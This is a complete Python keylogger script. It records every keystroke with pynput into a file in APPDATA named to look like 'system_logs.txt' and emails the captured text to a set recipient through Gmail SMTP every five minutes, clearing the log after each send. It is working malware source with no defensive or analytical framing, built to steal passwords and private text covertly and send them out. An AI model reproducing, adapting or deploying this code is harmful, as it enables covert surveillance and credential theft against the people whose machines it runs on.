import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import os
import threading
import time
from datetime import datetime

# Configuration
LOG_FILE = os.path.join(os.environ['APPDATA'], "system_logs.txt")
SEND_INTERVAL = 300  # Send logs every 5 minutes (in seconds)

# Email configuration (replace with your details)
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_app_password"  # Use app password for Gmail
RECIPIENT_EMAIL = "recipient_email@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Set up logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {str(key)}')

def send_logs():
    try:
        # Read the log file
        with open(LOG_FILE, 'r') as file:
            log_content = file.read()
        
        # Create email
        message = MIMEMultipart()
        message["From"] = EMAIL_ADDRESS
        message["To"] = RECIPIENT_EMAIL
        message["Subject"] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        # Attach log content
        message.attach(MIMEText(log_content, "plain"))
        
        # Connect to SMTP server and send email
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(message)
        
        # Clear the log file after sending
        with open(LOG_FILE, 'w') as file:
            file.write("")
            
        print(f"Logs sent at {datetime.now()}")
    except Exception as e:
        print(f"Error sending logs: {str(e)}")

def periodic_sender():
    while True:
        time.sleep(SEND_INTERVAL)
        send_logs()

def on_release(key):
    # Stop the program when ESC is pressed
    if key == keyboard.Key.esc:
        send_logs()  # Send final logs before stopping
        return False

# Set up the listener
if __name__ == "__main__":
    # Start the periodic sender thread (only when run directly)
    sender_thread = threading.Thread(target=periodic_sender)
    sender_thread.daemon = True
    sender_thread.start()

    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    )

    print("Keylogger started. Press ESC to stop.")
    listener.join()